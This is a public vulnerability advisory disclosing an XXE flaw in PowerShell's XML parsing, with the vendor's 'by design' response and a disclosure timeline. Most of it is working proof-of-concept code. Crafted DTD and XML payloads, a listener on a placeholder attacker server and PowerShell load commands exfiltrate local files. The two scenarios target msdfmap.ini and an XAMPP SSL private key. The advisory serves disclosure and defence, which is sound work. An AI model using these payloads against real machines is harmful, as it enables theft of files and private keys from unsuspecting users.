 
 
Vendor:
=================
www.microsoft.com
 
 
 
Product:
===========
PowerShell
 
 
PowerShell (including Windows PowerShell and PowerShell Core) is a task
automation and configuration management framework
from Microsoft, consisting of a command-line shell and associated scripting
language built on the .NET Framework.
PowerShell provides full access to COM and WMI, enabling administrators to
perform administrative tasks on both local
and remote Windows systems as well as WS-Management and CIM enabling
management of remote Linux systems and network devices.
 
 
 
Vulnerability Type:
===================
XML External Entity

 
 
Vulnerability Details:
=====================
 
PowerShell can read and process XML files, this is by design. However, its
XML parser is vulnerable to XXE attacks, if a user reads a
malicious XML file using powershells XML API. This can potentially allow
local files to be accessed and exfiltrated to an attackers server.
 
**MSRC response: "behavior by design for parsing".**
 
Issue is that this setting is default, this puts &#039;unknowing&#039; users at risk
for XXE attacks and file disclosure. After running PS to process an
Evil XML file from Windows CL you may see errors like:
 
"Cannot convert value "System.Object[]" to type "System.Xml.XmlDocument".
Error: "Invalid character in the given encoding"
 
OR
 
"Exception calling "Load" with "1" argument(s): "Unexpected DTD
declaration."
 
However, the Local to Remote file access theft still works as planned...
 
Tested Windows 7 SP1
 
 
PS C:\> $psversiontable
 
Name                           Value
----                           -----
CLRVersion                     2.0.50727.5485
BuildVersion                   6.1.7601.17514
PSVersion                      2.0
 
 
 
Exploit POC code(s):
===================
 
Scenarios A/B:
 
 
A) Reads XML from Web Server:
-------------------------------
 
Access &#039;c:\Windows\msdfmap.ini&#039; used by MS ADO Remote Service.
 
 
python -m SimpleHTTPServer 8080 (ATTACKER-SERVER)
 
 
&#039;payload.dtd&#039; (ATTACKER-SERVER)
 
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM &#039;http://
[ATTACKER-SERVER]:8080?%file;&#039;>">
%all;
 
 
 
&#039;PWN.xml&#039;  (ATTACKER-SERVER)
 
<?xml version="1.0"?>
<!DOCTYPE HYP3RLINX  [
<!ENTITY % file SYSTEM "c:\Windows\msdfmap.ini">
<!ENTITY % dtd SYSTEM "http://[ATTACKER-SERVER]:8080/payload.dtd">
%dtd;]>
<pwn>&send;</pwn>
 
 
Run from PS CL to load XML:
 
$vuln = New-Object System.Xml.XmlDocument
$vuln.Load("http://[ATTACKER-SERVER]/PWN.xml")
 
 
Users &#039;msdfmap.ini&#039; file is accessed by attacker.
 
 
B) Read XML from remote share in LAN:
----------------------------------------
 
Example uses three different computers.
 
VICTIM-COMPUTER local machine using Powershell to read XML.
REMOTE-SHARE is third computer in LAN where &#039;PWN.xml&#039; is read from.
ATTACKER-SERVER the place where files stolen from VICTIM-COMPUTER will be
sent.
 
Assuming user is running XAMPP, try target the servers SSL Private key.
 
[ATTACKER-SERVER]
 
python -m SimpleHTTPServer 8080
 
 
&#039;payload.dtd&#039; (Host on ATTACKER-SERVER)
 
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM &#039;http://
[ATTACKER-SERVER]:8080?%file;&#039;>">
%all;
 
 
&#039;PWN.xml&#039;   (Host on REMOTE-SHARE)
 
<?xml version="1.0"?>
<!DOCTYPE HYP3RLINX  [
<!ENTITY % file SYSTEM "C:\xampp\apache\conf\ssl.key\server.key">
<!ENTITY % dtd SYSTEM "http://[ATTACKER-SERVER]:8080/payload.dtd">
%dtd;]>
<pwn>&send;</pwn>
 
 
 
[VICTIM-COMPUTER]
 
Run these examples from PowerShell Command Line.
 
&#039;VULN.ps1&#039;
 
Get-WinEvent -FilterXml ([xml](Get-Content
\\[REMOTE-SHARE]\home\username\PWN.xml))
 
OR
 
$poc=&#039;\\[REMOTE-SHARE]\home\username\PWN.xml&#039;
$test=(Get-Content $poc) -as [Xml]
 
 
Enjoy your private key file!
 
 
 
Disclosure Timeline:
===========================================================
Vendor Notification: November 14, 2016
Vendor: "behavior by design for parsing." November 23, 2016
December 5, 2016 : Public Disclosure

